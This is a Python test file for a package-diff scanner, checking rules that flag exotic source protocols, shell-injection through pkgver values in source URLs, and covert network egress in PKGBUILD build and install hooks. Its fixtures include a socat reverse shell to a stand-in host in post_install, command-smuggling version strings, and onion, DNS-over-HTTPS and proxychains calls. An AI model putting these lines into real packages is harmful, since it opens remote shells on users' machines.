"""Behavioural tests for the Phase 3 network-surface rules
(R076 version-in-URL, R080 exotic protocol, R123 covert egress).

Each rule is asserted in both directions: the attack case fires, and the
plan's declared must-not-fire surface stays silent.  R123 fires only on
commands at a command position in a build/install function (a mention in a
string or a makedepends entry never does); R076 needs both an unsafe
literal pkgver and its interpolation into a source URL; R080 is judged on
the base of a ``transport+base`` scheme token.
"""

from trustsight.analysis import _structural_findings
from trustsight.differ import extract_urls_from_diff


def structural(diff_text: str) -> list[dict]:
    source_changes = extract_urls_from_diff(diff_text)
    return _structural_findings(diff_text, source_changes, {}, config={})


def ids(diff_text: str) -> set[str]:
    return {f["rule_id"] for f in structural(diff_text)}


# --- R080: exotic source protocol ---


def test_r080_fires_on_gopher_scheme():
    assert "R080" in ids('source=("gopher://x.example/y")\n')


def test_r080_fires_on_websocket_scheme():
    assert "R080" in ids('source=("wss://x.example/y")\n')


def test_r080_fires_on_scalar_source_line():
    assert "R080" in ids('source = "tftp://x.example/y"\n')


def test_r080_allowlisted_base_schemes_stay_quiet():
    for url in ("https://x/y", "git+https://x/y", "git://x/y", "ftp://x/y",
                "svn+ssh://x/y", "bzr+http://x/y"):
        assert "R080" not in ids(f'source=("{url}")\n'), url


def test_r080_judges_base_of_transport_token():
    assert "R080" not in ids('source=("tor+https://x/y")\n')


# --- R076: version-in-URL injection ---


def test_r076_fires_on_unsafe_pkgver_in_url():
    d = '+pkgver=1.0;echo evil\nsource=("https://x/$pkgver.tar.gz")\n'
    assert "R076" in ids(d)


def test_r076_fires_on_braced_interpolation():
    d = '+pkgver=1.0/../../etc\nsource=("https://x/${pkgver}.tar.gz")\n'
    assert "R076" in ids(d)


def test_r076_fires_on_underscore_pkgver():
    d = '+_pkgver=1.0|sh\nsource=("https://x/$_pkgver.tar.gz")\n'
    assert "R076" in ids(d)


def test_r076_safe_version_not_flagged():
    d = '+pkgver=1.2.3\nsource=("https://x/$pkgver.tar.gz")\n'
    assert "R076" not in ids(d)


def test_r076_unsafe_pkgver_not_interpolated_is_quiet():
    d = '+pkgver=1.0;echo evil\nsource=("https://x/static.tar.gz")\n'
    assert "R076" not in ids(d)


# --- R123: covert egress ---


def test_r123_fires_on_onion_host():
    assert "R123" in ids('+source=("http://h4x.onion/p.tar.gz")\n')


def test_r123_fires_on_doh_query():
    assert "R123" in ids('+build() {\n+  curl https://dns.google/dns-query?name=evil\n+}\n')


def test_r123_fires_on_configured_doh_endpoint():
    assert "R123" in ids('+build() {\n+  curl https://cloudflare-dns.com/dns-query\n+}\n')


def test_r123_fires_on_proxychains_in_build():
    assert "R123" in ids('+build() {\n+  proxychains curl https://x/y\n+}\n')


def test_r123_fires_on_socat_in_install_hook():
    assert "R123" in ids(
        '+post_install() {\n+  socat TCP:evil.example:4444 EXEC:sh\n+}\n'
    )


def test_r123_ignores_client_mention_in_string():
    assert "R123" not in ids(
        '+build() {\n+  echo "use proxychains at your own risk"\n+  make\n+}\n'
    )


def test_r123_ignores_client_as_dependency():
    assert "R123" not in ids("makedepends=('proxychains' 'tor')\n")


def test_r123_ignores_client_outside_build_install():
    assert "R123" not in ids('+helper() {\n+  ncat -l 4444\n+}\n')


def test_r123_clean_diff_is_quiet():
    assert "R123" not in ids('+build() {\n+  make\n+  install -Dm755 x "$pkgdir/usr/bin/x"\n+}\n')
